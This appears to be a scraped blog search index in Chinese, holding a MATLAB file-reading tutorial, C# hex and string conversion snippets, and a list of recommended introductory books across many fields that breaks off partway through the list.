dlmread(单一分隔符的纯数据或ASCII数据文件) textscan(类似于textread，但使用前必须fopen打开文件) csvread(类似于xlsread，读取.csv格式的文件) fscanf(读取已知文件格式的文本文件) matlab对文件中混乱的文本格式读取操作总结对于本文字符数字较为混乱的文本进行文本操作需要对文件内部进行操作，包括文本位置指针，文件逐行读取，字符匹配等等复杂操作。主要用到的几个函数有 1234feek(设置指针位置) ftell(获得指针位置) frewind(重设指针到文件起始位置) feof(测试指针是否在文件结束位置) 具体用法： 12345fseek(fid,-1,’eof’),指针到末尾 fseek(fid,2,’bof’),起始位置后第二个字符位置 ftell(fid);找到指针位置 frewind(fid),指针回到起始 feof(fid)判断指针是否在末尾 ※MATLAB 数据导入（ImportData） 在MATLAB中导入数据意味着从外部文件加载数据。该importdata功能允许加载不同格式的各种数据文件。它具有以下五种形式- 123456序号 功能说明1 A = importdata(filename) 从filename表示的文件中将数据加载到数组A中。2 A = importdata(&#x27;-pastespecial&#x27;) 从系统剪贴板而不是文件加载数据。3 A = importdata(___, delimiterIn) 将 delimiterIn 解释为 ASCII 文件、文件名或剪贴板数据中的列分隔符。可以对上述语法中的任何输入参数使用 delimiterIn。4 A = importdata(___, delimiterIn, headerlinesIn) 从ASCII文件，文件名或剪贴板中加载数据，并从行headerlinesIn + 1开始读取数字数据。5 [A, delimiterOut, headerlinesOut] = importdata(___) 使用前面语法中的任何输入参数，返回delimiterOut中输入ASCII文件的检测到的分隔符字符和headerlinesOut中检测到的头行数。 默认情况下，Octave不支持该importdata()功能，因此您必须搜索并安装此软件包才能使以下示例适用于Octave安装。 实例1 让我们加载并显示图像文件。创建一个脚本文件并在其中键入以下代码- 123filename = &#x27;smile.jpg&#x27;;A = importdata(filename);image(A); 运行文件时，MATLAB将显示图像文件。但是，必须将其存储在当前目录中。 实例2 在此示例中，我们导入一个文本文件并指定Delimiter和Column Header。让我们创建一个以空格分隔的ASCII文件，其中包含标题为weeklydata.txt的列标题。 我们的文本文件weeklydata.txt看起来像这样- 123456SunDay MonDay TuesDay WednesDay ThursDay FriDay SaturDay95.01 76.21 61.54 40.57 55.79 70.28 81.5373.11 45.65 79.19 93.55 75.29 69.87 74.6860.68 41.85 92.18 91.69 81.32 90.38 74.5148.60 82.14 73.82 41.03 0.99 67.22 93.1889.13 44.47 57.63 89.36 13.89 19.88 46.60 创建一个脚本文件并在其中键入以下代码- 1234567891011filename = &#x27;weeklydata.txt&#x27;;delimiterIn = &#x27; &#x27;;headerlinesIn = 1;A = importdata(filename,delimiterIn,headerlinesIn);% View datafor k = [1:7] disp(A.colheaders&#123;1, k&#125;) disp(A.data(:, k)) disp(&#x27; &#x27;)end 运行文件时，它显示以下结果- 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748SunDay 95.0100 73.1100 60.6800 48.6000 89.1300 MonDay 76.2100 45.6500 41.8500 82.1400 44.4700 TuesDay 61.5400 79.1900 92.1800 73.8200 57.6300WednesDay 40.5700 93.5500 91.6900 41.0300 89.3600 ThursDay 55.7900 75.2900 81.3200 0.9900 13.8900 FriDay 70.2800 69.8700 90.3800 67.2200 19.8800SaturDay 81.5300 74.6800 74.5100 93.1800 46.6000 实例3 在此示例中，让我们从剪贴板导入数据。 将以下行复制到剪贴板- Mathematics is simple 创建一个脚本文件并输入以下代码- 1A = importdata(&#x27;-pastespecial&#x27;) 运行文件时，它显示以下结果- 12A = &#x27;Mathematics is simple&#x27; ※底层文件I / O importdata函数是一个高级函数。MATLAB中的底层文件I/O函数允许对文件的读写数据进行最大程度的控制。但是，这些函数需要更详细的文件信息才能有效地工作。 MATLAB为字节或字符级别的读写操作提供以下函数- 1234567891011121314函数 描述fclose 关闭一个或所有打开的文件feof 文件结尾测试ferror 有关文件I/O错误的信息fgetl 从文件中读取行，删除换行符fgets 从文件中读取行，保留换行符fopen 打开文件，或获取有关打开文件的信息fprintf 将数据写入文本文件fread 从二进制文件读取数据frewind 将文件位置指示器移动到打开文件的开头fscanf 从文本文件读取数据fseek 移动到文件中的指定位置ftell 在打开文件中的位置fwrite 将数据写入二进制文件 导入具有底层I / O的文本数据文件 MATLAB提供以下功能用于文本数据文件的底层导入- fscanf函数读取文本或ASCII文件中的格式化数据。 fgetl和fgets的时间，其中，一个换行字符的每一行分离功能读取的文件的一行。 fread函数读取字节或位级别的数据流。 在线示例我们在工作目录中保存了一个文本数据文件“ myfile.txt”。该文件存储了三个月的降雨数据；2012年的六月，七月和八月。 myfile.txt数据文件包含五个地点的时间、月份和降雨量的重复测量集。头数据存储月数M；因此我们有M组度量。 该文件看起来像这样- 12345678910111213141516171819202122232425262728293031Rainfall DataMonths: June, July, August M = 312:00:00June-201217.21 28.52 39.78 16.55 23.6719.15 0.35 17.57 NaN 12.0117.92 28.49 17.40 17.06 11.099.59 9.33 NaN 0.31 0.23 10.46 13.17 NaN 14.89 19.3320.97 19.50 17.65 14.45 14.0018.23 10.34 17.95 16.46 19.3409:10:02July-201212.76 16.94 14.38 11.86 16.8920.46 23.17 NaN 24.89 19.3330.97 49.50 47.65 24.45 34.0018.23 30.34 27.95 16.46 19.3430.46 33.17 NaN 34.89 29.3330.97 49.50 47.65 24.45 34.0028.67 30.34 27.95 36.46 29.3415:03:40August-201217.09 16.55 19.59 17.25 19.2217.54 11.45 13.48 22.55 24.01NaN 21.19 25.85 25.05 27.2126.79 24.98 12.23 16.99 18.6717.54 11.45 13.48 22.55 24.01NaN 21.19 25.85 25.05 27.2126.79 24.98 12.23 16.99 18.67 我们将从该文件导入数据并显示此数据。采取以下步骤- 使用fopen函数打开文件并获取文件标识符。 用来描述文件中的数据格式说明符，例如’ %s’表示字符串，’ %d’表示整数，或’ %f’表示浮点数。 要跳过文件中的文字字符，请在格式说明中包括它们。要跳过数据字段，请在说明符中使用星号（‘*’）。 例如，要读取标头并返回M的单个值，我们这样写- 1M = fscanf(fid, &#x27;%*s %*s\\n%*s %*s %*s %*s\\nM=%d\\n\\n&#x27;, 1); 默认情况下，fscanf根据我们的格式说明读取数据，直到找不到与数据匹配的内容，或者到达文件末尾为止。在这里，我们将使用for循环读取3组数据，并且每次将读取7行和5列。 我们将在工作区中创建一个名为mydata的结构，以存储从文件中读取的数据。这种结构有三个字段-time, month, and raindata数组。 创建一个脚本文件并在其中键入以下代码- 123456789101112131415161718192021222324252627filename = &#x27;/data/myfile.txt&#x27;;rows = 7;cols = 5;%打开文件fid = fopen(filename);%读取文件头，找到M（月数）M = fscanf(fid, &#x27;%*s %*s\\n%*s %*s %*s %*s\\nM=%d\\n\\n&#x27;, 1);%读取每一组测量数据for n = 1:M mydata(n).time = fscanf(fid, &#x27;%s&#x27;, 1); mydata(n).month = fscanf(fid, &#x27;%s&#x27;, 1); %fscanf按列顺序填充数组， %把结果转置 mydata(n).raindata = ... fscanf(fid, &#x27;%f&#x27;, [rows, cols]);endfor n = 1:M disp(mydata(n).time), disp(mydata(n).month) disp(mydata(n).raindata)end %关闭文件fclose(fid); 运行文件时，它显示以下结果- 123456789101112131415161718192021222324252627282912:00:00June-2012 17.2100 17.5700 11.0900 13.1700 14.4500 28.5200 NaN 9.5900 NaN 14.0000 39.7800 12.0100 9.3300 14.8900 18.2300 16.5500 17.9200 NaN 19.3300 10.3400 23.6700 28.4900 0.3100 20.9700 17.9500 19.1500 17.4000 0.2300 19.5000 16.4600 0.3500 17.0600 10.4600 17.6500 19.340009:10:02July-2012 12.7600 NaN 34.0000 33.1700 24.4500 16.9400 24.8900 18.2300 NaN 34.0000 14.3800 19.3300 30.3400 34.8900 28.6700 11.8600 30.9700 27.9500 29.3300 30.3400 16.8900 49.5000 16.4600 30.9700 27.9500 20.4600 47.6500 19.3400 49.5000 36.4600 23.1700 24.4500 30.4600 47.6500 29.340015:03:40August-2012 17.0900 13.4800 27.2100 11.4500 25.0500 16.5500 22.5500 26.7900 13.4800 27.2100 19.5900 24.0100 24.9800 22.5500 26.7900 17.2500 NaN 12.2300 24.0100 24.9800 19.2200 21.1900 16.9900 NaN 12.2300 17.5400 25.8500 18.6700 21.1900 16.9900 11.4500 25.0500 17.5400 25.8500 18.6700","tags":"matllab"},{"title":"Scholar","url":"/20220101/scholar/","text":"","tags":"github-page"},{"title":"hexo-theme-scholar-future","url":"/20220101/hexo-theme-scholar-future/","text":"","tags":"github-page"},{"title":"resource-navigator","url":"/20220101/resource-navigator/","text":"","tags":"github-page resource"},{"title":"Raspberry-Pi-config","url":"/20220101/raspberry-pi-config/","text":"","tags":"github-page"},{"title":"Termux-config","url":"/20220101/termux-config/","text":"","tags":"github-page termux"},{"title":"donate-plugin","url":"/20220101/donate-plugin/","text":"","tags":"github-page"},{"title":"keys","url":"/20220101/keys/","text":"","tags":"github-page"},{"title":"open-ebook","url":"/20220101/open-ebook/","text":"","tags":"github-page resource"},{"title":"Defence-Technology","url":"/20220101/defence-technology/","text":"","tags":"github-page"},{"title":"Machine-learning-Related","url":"/20220101/machine-learning-related/","text":"","tags":"github-page"},{"title":"NWPU-Open-Course-Sharing","url":"/20220101/nwpu-open-course-sharing/","text":"","tags":"github-page resource"},{"title":"C-16进制与字符串、字节数组之间的转换","url":"/20211027/c-16-jin-zhi-yu-zi-fu-chuan-zi-jie-shu-zu-zhi-jian-de-zhuan-huan/","text":"16进制与字符串、字节数组之间的转换 https://www.cnblogs.com/zoujinhua/p/11540964.html 请问c#中如何将十进制数的字符串转化成十六进制数的字符串 1234567891011//十进制转二进制Console.WriteLine(&quot;十进制166的二进制表示: &quot;+Convert.ToString(166, 2));//十进制转八进制Console.WriteLine(&quot;十进制166的八进制表示: &quot;+Convert.ToString(166, 8));//十进制转十六进制 Console.WriteLine(&quot;十进制166的十六进制表示: &quot;+Convert.ToString(166, 16));//二进制转十进制Console.WriteLine(&quot;二进制 111101 的十进制表示: &quot;+Convert.ToInt32(&quot;111101&quot;, 2));//八进制转十进制Console.WriteLine(&quot;八进制 44 的十进制表示: &quot;+Convert.ToInt32(&quot;44&quot;, 8));//十六进制转十进制Console.WriteLine(&quot;十六进制 CC的十进制表示: &quot;+Convert.ToInt32(&quot;CC&quot;, 16)); 2.在串口通讯过程中，经常要用到 16进制与字符串、字节数组之间的转换 123456789101112131415161718192021222324private string StringToHexString(string s, Encoding encode)&#123; byte[] b = encode.GetBytes(s);//按照指定编码将string编程字节数组 string result = string.Empty; for (int i = 0; i &lt; b.Length; i++)//逐字节变为16进制字符，以%隔开 &#123; result += &quot;%&quot; + Convert.ToString(b[i], 16); &#125; return result;&#125;private string HexStringToString(string hs, Encoding encode)&#123; //以%分割字符串，并去掉空字符 string[] chars = hs.Split(new char[] &#123; &#x27;%&#x27; &#125;, StringSplitOptions.RemoveEmptyEntries); byte[] b = new byte[chars.Length]; //逐个字符变为16进制字节数据 for (int i = 0; i &lt; chars.Length; i++) &#123; b[i] = Convert.ToByte(chars[i], 16); &#125; //按照指定编码将字节数组变为字符串 return encode.GetString(b);&#125; 字符串转16进制字节数组 123456789101112131415/// &lt;summary&gt;/// 字符串转16进制字节数组/// &lt;/summary&gt;/// &lt;param name=&quot;hexString&quot;&gt;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;private static byte[] strToToHexByte(string hexString)&#123; hexString = hexString.Replace(&quot; &quot;, &quot;&quot;); if ((hexString.Length % 2) != 0) hexString += &quot; &quot;; byte[] returnBytes = new byte[hexString.Length / 2]; for (int i = 0; i &lt; returnBytes.Length; i++) returnBytes[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16); return returnBytes;&#125; 字节数组转16进制字符串 1234567891011121314151617/// &lt;summary&gt;/// 字节数组转16进制字符串/// &lt;/summary&gt;/// &lt;param name=&quot;bytes&quot;&gt;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string byteToHexStr(byte[] bytes)&#123; string returnStr = &quot;&quot;; if (bytes != null) &#123; for (int i = 0; i &lt; bytes.Length; i++) &#123; returnStr += bytes[i].ToString(&quot;X2&quot;); &#125; &#125; return returnStr;&#125; 从汉字转换到16进制 123456789101112131415161718192021222324252627/// &lt;summary&gt;/// 从汉字转换到16进制/// &lt;/summary&gt;/// &lt;param name=&quot;s&quot;&gt;&lt;/param&gt;/// &lt;param name=&quot;charset&quot;&gt;编码,如&quot;utf-8&quot;,&quot;gb2312&quot;&lt;/param&gt;/// &lt;param name=&quot;fenge&quot;&gt;是否每字符用逗号分隔&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string ToHex(string s, string charset, bool fenge)&#123; if ((s.Length % 2) != 0) &#123; s += &quot; &quot;;//空格 //throw new ArgumentException(&quot;s is not valid chinese string!&quot;); &#125; System.Text.Encoding chs = System.Text.Encoding.GetEncoding(charset); byte[] bytes = chs.GetBytes(s); string str = &quot;&quot;; for (int i = 0; i &lt; bytes.Length; i++) &#123; str += string.Format(&quot;&#123;0:X&#125;&quot;, bytes[i]); if (fenge &amp;&amp; (i != bytes.Length - 1)) &#123; str += string.Format(&quot;&#123;0&#125;&quot;, &quot;,&quot;); &#125; &#125; return str.ToLower();&#125; 16进制转换成汉字 1234567891011121314151617181920212223242526272829303132333435363738///&lt;summary&gt;/// 从16进制转换成汉字/// &lt;/summary&gt;/// &lt;param name=&quot;hex&quot;&gt;&lt;/param&gt;/// &lt;param name=&quot;charset&quot;&gt;编码,如&quot;utf-8&quot;,&quot;gb2312&quot;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string UnHex(string hex, string charset)&#123; if (hex == null) throw new ArgumentNullException(&quot;hex&quot;); hex = hex.Replace(&quot;,&quot;, &quot;&quot;); hex = hex.Replace(&quot;\\n&quot;, &quot;&quot;); hex = hex.Replace(&quot;\\\\&quot;, &quot;&quot;); hex = hex.Replace(&quot; &quot;, &quot;&quot;); if (hex.Length % 2 != 0) &#123; hex += &quot;20&quot;;//空格 &#125; // 需要将 hex 转换成 byte 数组。 byte[] bytes = new byte[hex.Length / 2]; for (int i = 0; i &lt; bytes.Length; i++) &#123; try &#123; // 每两个字符是一个 byte。 bytes[i] = byte.Parse(hex.Substring(i * 2, 2), System.Globalization.NumberStyles.HexNumber); &#125; catch &#123; // Rethrow an exception with custom message. throw new ArgumentException(&quot;hex is not a valid hex number!&quot;, &quot;hex&quot;); &#125; &#125; System.Text.Encoding chs = System.Text.Encoding.GetEncoding(charset); return chs.GetString(bytes);&#125; 生成不重复随机数的方法 123456789101112131415161718public class RandomHelper&#123; /// &lt;summary&gt; ///生成制定位数的随机码（数字） /// &lt;/summary&gt; /// &lt;param name=&quot;length&quot;&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public static string GenerateRandomCode(int length) &#123; var result = new StringBuilder(); for (var i = 0; i &lt; length; i++) &#123; var r = new Random(Guid.NewGuid().GetHashCode()); result.Append(r.Next(0, 10)); &#125; return result.ToString(); &#125;&#125;","tags":"c# codesnippet"},{"title":"各领域最值得推荐的入门书籍","url":"/20210526/ge-ling-yu-zui-zhi-de-tui-jian-de-ru-men-shu-ji/","text":"以下来自转载，出处不可考。 1. 师从天才 作者 : [美] 罗伯特·卡尼格尔 出版社 : 上海科技教育出版社 评语 : sunfield推荐（药理学）：介绍里说这本书说的是科研界的师承关系，其实大部分讲的是现代药理学的发展史。 2. 普通生物学 作者 : 陈阅增 出版社 : 高等教育出版社 评 语 : 桔子（细胞生物学）推荐：我就是高中看《普通生物学》才突然对生物感兴趣。以至于报考时候脑子里除了生物其它什么也不知道。比后来编的所谓什么“面向21 世纪教材”强多了；生物学入门的好书；come_god说：记得高三参加全国生物学竞赛时看的第一本书。《普通生物学》高教出版社 3. 什么是数学 作者 : [美] R·柯朗 H·罗宾 著/I·斯图尔特 修订 出版社 : 复旦大学出版社 评语 : 数学专业众人推荐 4. 病者生存 作者 : （美）莫勒姆，（美）普林斯 著，邵毓敏 译 出版社 : 广西科学技术出版社 评语 : BoBo（医学）推荐：从新的角度来看我们所生的疾病。英文原本也不长的。这本中译本，看看既新鲜又产生很多奇怪想法。 5. 物理世界奇遇记 作者 : （美）伽莫夫/（英）斯坦纳德 出版社 : 科学出版社 评语 : bullimit（理论物理）推荐：这本书中对理论物理基础做了极富独创性而又深刻的描述， 不是一般物理类的科普书-例如时间简史所能够比得上的。 6. 追寻记忆的痕迹 作者 : [美] 埃里克·坎德尔 出版社 : 中国轻工业出版社 评语 : 我的推荐（神经科学）：可当作梳理神经科学历史的一本书 7. 梦断代码 作者 : Scott Rosenberg 出版社 : 电子工业出版社 评语 : idel（软件工程）推荐：如果是项目管理和风险控制呢，可以看《梦断代码》；如果只是单纯的追求写程序的艺术呢，可以看《编程之道》；如果是追求技术卓越，可以看《代码大全 8. 编码的奥秘 作者 : Charles Petzold/伍卫国/王宣政/孙燕妮 出版社 : 机械工业出版社 评语 : windstorm（计算机工程，嵌入式）推荐；come_god 说，什么都不说了，大家可以去找来看。神作！ 9. 大众天文学(上下两册) 作者 : C.弗拉马里翁 出版社 : 广西师范大学出版社 评语 : Gerry（天文学）的推荐 10. 费恩曼物理学讲义（第1卷） 作者 : Richard P. Feynman/Robert B. Leighton/Matthew Sands 出版社 : 上海科学技术出版社 评语 : Yin Zhangqi推荐（量子光学）：用于学习现代物理学非常有帮助。如果想专门学习量子物理学，可以读第三卷，是入门的好教材；bullimit点评：经典，同时还可以结合阅读费曼的两本自传及QED这本演讲集来作为辅助入门读物。 11. 环境科学：全球关注 上下 作者 : 库宁汉姆 出版社 : 科学出版社 评语 : newgnaw（环境科学）：有中译本，虽然个别地方译的不是太好。比国内的各种教材入的深，出的浅，有趣得多。 12. 最大的小发明：螺丝与螺丝刀 作者 : 里布金斯基 出版社 : 百花文艺出版社 评语 : 霹雳东风（机械专业）推荐：前半部分有些学究考古的味道，没什么意思。后半部分被这个外行人道出了机械行业一个最关键的概念之一——精度。而且从螺丝的角度来讲精度，就相当于是从加工工艺的角度去讲。所以这本书相当靠谱。 13. 世界科学技术通史 作者 : 麦克莱伦第三 出版社 : 上海科技教育出版社 评语 : 吃瓜王（科学史）推荐 14. 建筑空间组合论（第三版） 作者 : 彭一刚 著 出版社 : 中国建筑工业出版社 评语 : chenglixiang88（建筑）：最后一章用处不大，这本书我现在还没读透 15. 《华尔街日报》是如何讲故事的 作者 : [美] 威廉·E.布隆代尔 出版社 : 华夏出版社 评语 : 不过如此了得（新闻传播学）推荐 16. 诤语良言:与青年记者谈新闻写作 作者 : 刘其中 出版社 : 新华出版社 评语 : ida推荐：我就是靠着它，从不懂得新闻的人，到通过了许多报社的笔试。 17. 法律之门 作者 : [美] 博西格诺 出版社 : 华夏出版社 评语 : shumi1推荐：虽然这是美国法学院的教科书，但你完全可以当作案例故事书来读。一书在手，足以应付你在中文网络环境中可能遇见的关于美国法律的问题。 18. 心理学与生活 作者 : [美] 理查德·格里格/菲利普·津巴多 出版社 : 人民邮电出版社 评语 : 心理学众人推荐：大妈级经典畅销书了；《×××与生活》系列是牛书！《伦理学与生活》，《经济学与生活》还有同系列的《听音乐》强烈推荐。 19. 登天的感觉:我在哈佛大学做心理咨询(修订本) (平装) 作者 : 岳晓东 出版社 : 上海人民出版社 评语 : 0.618（咨询心理学领域）推荐 20. 实验心理学(第7版) 作者 : 索尔索 出版社 : 中国轻工业出版社 评 语 : 世界公民顾彬（心理学）推荐：实验心理学是心理学的灵魂，所以推荐实验心理学的书，最能代表心理学这门学科。此书不但注重研究实例，而且对心理学实验研究 的基本原则、实验设计的各种模式和实验研究的具体过程都论述得精辟、详细、透彻。此书享有很高的声誉。目前已经修订到第七版。 21. Lehninger生物化学原理（第3版） 作者 : David L.Nelson/Michael M.Cox 出版社 : 高等教育出版社 评语 : Riverbed推荐：生物化学入门 22. 思维的版图 作者 : 理查德.尼斯贝特 出版社 : 中信出版社 评语 : 文化心理学的推荐 23. 社会心理学（第8版） 作者 : [美] 戴维·迈尔斯 出版社 : 人民邮电出版社 24. 与“众”不同的心理学 作者 : Keith E.Stanovich 出版社 : 中国轻工业出版社 评语 : 它不厚，特点在于纠正了大众对心理科学的误读误解。 25. 所罗门王的指环-劳伦兹动物行为学著作系列 作者 : (奥)劳伦兹 出版社 : 中国和平出版社 评语 : 动物行为学之推荐 26. 信息时代的儿童发展 作者 : 桑德拉·L.卡尔弗特 出版社 : 商务印书馆 评语 : 蓝枫(心理学）推荐：最近在看它，感觉以人为本的心理咨询的发展，不能被连DNA阿姨（我在找抽！）都认为仅仅是 忆往昔童年 卧舒适躺椅 精神分析 刺激应激 这些。 27. 人工智能的未来 作者 : Jeff Hawkins/Sandra Blakeslee 出版社 : 陕西科学技术出版社 评语 : 人工智能方面的推荐 28. 花的智慧 作者 : (比)莫里斯·梅特林克 出版社 : 漓江出版社 评语 : 翼紫岚（植物生殖生物学）推荐 29. 外部空间设计 作者 : 芦原义信 出版社 : 中国建筑工业出版社 评语 : phare（风景园林）：现在就能找到电子版了 30. 清洁与高雅-浴室和水厕趣史 作者 : [英]劳伦斯·赖特 出版社 : 商务印书馆 评语 : 街角的蔷薇（给排水工程）推荐：推荐的是商务出版局出版的，英国人劳伦斯·赖特所著的《清洁与高雅》。虽然它介绍的不是工程学，却从我们日常的清洗用具入手，配有大量插图，很有趣。 31. 蒙面骑士 作者 : （墨）马科斯 出版社 : 上海人民出版社 评语 : lynn推荐：号称切格瓦拉的继承人，在丛林里运用公共关系和外部世界斗争，喜欢公关广告和媒体的愤青应该都会喜欢的。 32. 理解航天:航天学入门 作者 : （美）塞勃 出版社 : 清华大学出版社 评语 : 赵洋推荐：航天学入门 33. 改变世界的方程：牛顿、爱因斯坦和相对论 作者 : （德）弗里奇 出版社 : 上海科技教育出版社 评 语 : 谭伦（相对论）推荐：对相对论感兴趣但又觉得难以靠近的朋友，可以看看《改变世界的方程 ——牛顿爱因斯坦和相对论》，作者是哈拉尔德．弗里奇(Harald Fritzsch，1943—)，著名理论物理学家，现任慕尼黑大学久享盛誉的索末菲教授职位，其中《夸克》(Quarks)一书的中译本拥有众多读者。 本书以虚拟对话的方式设计了牛顿从自己创立的宏观经典力学的角度对爱因斯坦相对论提出的疑问，然后由爱因斯坦进行回答，一问一答，读者仅具有高中牛顿力学 的知识就可以，正适合我们这些本科不是物理学专业的学生阅读 34. 语言本能 作者 : (美)史迪芬.平克 出版社 : 汕头大学出版社 评语 : Tony Yet （语言学）推荐：那是一本能够让你越看越着迷的书，关于语言学的众多秘密都在该书里面提到了。推荐看英文版。 35. 一个广告人的自白 作者 : 大卫·奥格威 出版社 : 中信出版社 评语 : shouren258（广告学）推荐 36. 超越CSS 作者 : Andy Clarke 出版社 : 人民邮电出版社 评语 : sasa（网页设计）推荐 37. 相同与不同 作者 : 洛德·霍夫曼 出版社 : 吉林人民出版社 评语 : xzchem（化学）推荐 38. 美国大城市的死与生（纪念版） 作者 : [加拿大] 简·雅各布斯 出版社 : 译林出版社 评语 : yola（城市规划）推荐：生动而充满责任感。有很亲切的小故事，一如作者并非科班城规专家的出身。相当细腻的描述与分析，反而不像是如此伟大的里程碑式的著作。倒像是捷克作家那种纯真好玩的小说与传记。 39. 古典作曲家排行榜 作者 : 菲尔.G.古尔丁 出版社 : 海南出版社 评语 : 二少爷推荐：作为爱好的古典音乐，推荐的是《古典作曲家排行榜》行文风趣幽默，绝对适合上手。 40. 离散数学及其应用 作者 : （美）罗森 著，袁崇义 等译 出版社 : 机械工业出版社 评语 : obtuseSword推荐：深入浅出，仅需要高中知识，我就是高中开始学的，数学从不及格升到了班级第一，主要是这本书能让人学会数学思维，以及引起对数学的兴趣。 41. 博弈论基础 作者 : 高峰 罗伯特·吉本斯 出版社 : 中国社会科学出版社 评语 : einheriar推荐：推荐一本博弈论的吧：罗伯特.吉本斯的《博弈论基础》。一个小绿皮册子，比较好读，对数学要求不高^^如果看完不过瘾的话，推荐Tirole的那本《博弈论》，不过这个应该超标了吧…… 42. 计算机网络 作者 : Andrew S. Tanenbaum 出版社 : 清华大学出版社 评语 : RustingSword （计算机科学与技术）推荐：很有意思的一本书~中文版翻译得也不错。 43. 全球化下的社会变迁与非政府组织(NGO) 作者 : 范丽珠 出版社 : 上海人民出版社 评 语 : 蓝枫（管理科学与工程）推荐：大家很多都是用西方管理学的思想在做事情，这样很不好。决策管理派、科学派管理很多学派的模型换上我国环境后是不适用的。那 组织管理也是这样。组织管理中大家是否考虑过如果组织成员间没有稀缺资源的约束但以组织目的为核心的志愿式社会企业管理方法呢~~~如果你说这种小组织管 理有啥难的，那希望你不吝赐教。 44. 安藤忠雄连战连败 作者 : (日)安藤忠雄 出版社 : 中国建筑工业出版社 评语 : goodluck（建筑学）推荐 45. Kirklin/Barratt-Boyes心脏外科学两卷套（第3版） Kirklin/Barratt-Boyes Cardiac Surgery 作者 : Nicholas Kouchoukos 著 出版社 : Oversea Publishing House 评语 : TEA（心脏外科）推荐：经典中的经典 46. 综合评价理论、方法及应用 作者 : 郭亚军 出版社 : 科学出版社 评语 : Waitinsea（综合评价）推荐：2007年（第二版，比第一版增加了一些评价模型——这些模型不易看懂，初学者可忽略） 47. 机械设计手册.单行本.机械振动·机架设计 作者 : 成大先 出版社 : 化学工业出版社 评语 : 庞国栋（机械设计）推荐：如果对机械想有所了解一本书就够了。我推荐————————《机械设计手册》 48. 普通地质学简明教程 作者 : 杨伦 出版社 : 中国地质大学出版社 评语 : 零余子推荐：地质学 49. 艺术的故事 作者 : [英] 贡布里希 (Sir E.H.Gombrich) 出版社 : 广西美术出版社 评语 : heather09推荐 50. 工程热力学 作者 : 曾丹苓 出版社 : 高等教育出版社 评语 : lepetitprince （热能工程专业）推荐 51. 如何求解问题：现代启发式方法 作者 : Zbigniew Michalewicz/David B.Fogel 出版社 : 中国水利水电出版社 评语 : Ren（演化计算）推荐：很适合入门 52. Head First Object-Oriented Analysis and Design 作者 : Brett D. McLaughlin/Gary Pollice/Dave West 出版社 : O'Reilly Media 评语 : 西西弗（计算机）推荐：计算机类的太多太多，这本是关于软件设计的。图文并茂，深入浅出。 53. 原动画基础教程 作者 : 威廉姆斯 出版社 : 中国青年出版社 评语 : lotus （动画）推荐：基础啊！完全的基础！ 54. 测绘学概论（第二版） 作者 : 宁津生，陈俊勇，李德仁，刘经南，张祖勋 等编著 出版社 : 武汉大学出版社 评语 : Jarod （测绘学）推荐 55. 风景园林设计要素 作者 : 诺曼K.布思 出版社 : 中国林业出版社 评语 : pink（园林设计）推荐：要是想了解园林和景观设计这个专业（我是指广义上的这个专业，而不仅仅是中国或西方古典园林），那么你有很多消遣类的书籍可供选择；但是如果你想学习这个专业，那么请看看这本《风景园林设计要素》。 56. 计算流体力学基础及其应用 作者 : （美）约翰D.安德森（JohnD.Anderson） 著，吴颂平，刘赵森 译 出版社 : 机械工业出版社 评语 : ziplb（流体力学）：cfd方向经典教材，浅显易懂。Computational Fluid Dynamics计算流体力学基础及其应用。是清华大学出版社的影印版是原文版 57. 历届CMO中国数学奥林匹克试题集1986-2009 作者 : 刘北兴 出版社 : 哈尔滨工业大学出版社 评语 : 王世强（材料成型及控制工程）推荐 58. Biomimicry 作者 : Janine M. Benyus 出版社 : Harper Perennial 评语 : Fujia（仿生学）推荐 59. 训诂学(修订本) 作者 : 郭在贻 出版社 : 中华书局 评语 : lmzs（古典文献）推荐：训诂学是古典文献专业的入门学科，这本书薄薄一本，却深入浅出，知识丰富又具有学术价值。读来饶有趣味 60. 搏击沧海――地学革命风云录（第二版） 作者 : （瑞士）许靖华 著 出版社 : 地质出版社 评语 : 地球科学 61. 机器学习 作者 : （美）米歇尔（Mitchell，T.M.） 著；曾华军 等译 出版社 : 机械工业出版社 评语 : gflfof推荐：人工智能方面应该推荐Mitchell的机器学习比较好吧，这本书才是真正描述了人工智能的重要分支之一到底在做些什么，内容不难容易读懂，而且还能在研究中用上，说到高中水平，把计算学习理论那章删去就好了 62. 从一到无穷大 作者 : [美] G. 伽莫夫 出版社 : 科学出版社 评语 : 数学入门推荐 63. 统计学的世界（第五版） 作者 : David S. Moore/William I. Notz 出版社 : 中信出版社 评语 : lang推荐：统计学入门 64. 创世纪的第八天:20世纪分子生物学革命 作者 : 霍勒斯・贾德森/李晓丹 出版社 : 上海科学技术出版社 评语 : 我的推荐：分子生物学入门，梳理历史，大家都以为别人会推荐吧…… 65. 埃及考古学 作者 : 刘文鹏 出版社 : 生活·读书·新知三联书店 评语 : by推荐：埃及学 66. 灵魂机器的时代：当计算机超过人类智能时 作者 : （美）库兹韦尔/Ray Kurzweil 出版社 : 上海译文出版社 评语 : by推荐：奇点理论 67. 文化人类学 作者 : 威廉·A·哈维兰 出版社 : 上海社会科学院出版社 评语 : injoy（人类学）推荐：强烈推荐弗雷泽的名著《金枝》，人类学领域的大师级经典，另外还有入门普及书《文化人类学》 68. 双螺旋 作者 : [美] J. D. 沃森 出版社 : 科学出版社 评语 : 分子生物学的推荐，sunfield说，记得饶毅先生和蒲慕明教授不止一个场合推荐过 69. 叔本华的治疗 作者 : 欧文·亚龙 出版社 : 希望出版社 评 语 : 蔓珠莎华（专业：神经内科学、心理学）推荐：心理学在大众眼中是如此神秘、如此唯心，以至于从综合医院的老教授还是年轻有为的医生，还是普通老百姓都斜眼 看着从事心理治疗的那些“谈话者”们。如何将心理学、心理分析、认知行为治疗、催眠等等等等最基本的原理和认识呈现于大众，于它就像吃喝拉撒、读书看报一 样熟视无睹；把走进治疗室当成进餐厅、进售楼中心一样平常，去读读亚龙的一系列心理读物，这本叔本华的治疗不失为又有深度又能浅显的说明问题而且能吸引普 通读者的一本书，亚龙的写作才华也是我更应该学习的地方。 70. 金枝（上下册） 作者 : [英] J.G.弗雷泽 出版社 : 新世界出版社 评语 : 人类学的推荐：现代人类学奠基之作 71. 我怎样设计飞机--美国飞机设计师凯利・约翰逊自传 作者 : 凯利・约翰逊 出版社 : 航空工业出版社 评语 : 